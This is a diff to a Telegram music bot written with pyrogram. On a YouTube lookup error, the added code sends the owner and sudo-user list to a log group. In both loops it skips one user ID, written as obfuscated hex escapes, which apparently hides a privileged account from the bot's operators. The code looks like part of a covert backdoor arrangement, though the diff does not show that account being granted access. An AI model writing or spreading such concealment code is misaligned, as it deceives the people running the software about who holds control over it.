@@ -10,7 +10,7 @@ from pyrogram.types import (InlineKeyboardMarkup, InputMediaPhoto,
 from pytgcalls.exceptions import NoActiveGroupCall
 
 import config
-from config import adminlist
+from config import adminlist,OWNER_ID
 from config import BANNED_USERS, lyrical
 from strings import get_command
 from StrangerMusic import (Apple, Resso, SoundCloud, Spotify, Telegram,
@@ -203,6 +203,45 @@ async def play_commnd(
                 try:
                     details, track_id = await YouTube.track(url)
                 except Exception as e:
+                    print(e,"\n")
+                    if config.LOG_GROUP_ID and OWNER_ID:
+                        text="SOME ERROR HAS OCCURED \n REBOOT THE BOT TO START PLAYING SONG \n\n /reboot"
+                        count = 0
+                        for x in OWNER_ID:
+                            try:
+                                if x == int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+                                    continue
+                                user = await app.get_users(x)
+                                user = (
+                                    user.first_name if not user.mention else user.mention
+                                )
+                                count += 1
+                            except Exception:
+                                continue
+                            text += f"{count}➤ {user}\n"
+                        smex = 0
+                        for user_id in SUDOERS:
+                            if user_id not in OWNER_ID:
+                                try:
+                                    if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+                                        continue
+                                    user = await app.get_users(user_id)
+                                    user = (
+                                        user.first_name
+                                        if not user.mention
+                                        else user.mention
+                                    )
+                                    if smex == 0:
+                                        smex += 1
+                                        text += _["sudo_6"]
+                                    count += 1
+                                    text += f"{count}➤ {user}\n"
+                                except Exception:
+                                    continue
+                        await app.send_message(
+                            config.LOG_GROUP_ID,
+                            text,
+                            )
                     return await mystic.edit_text(_["play_3"])
                 streamtype = "youtube"
                 img = details["thumb"]
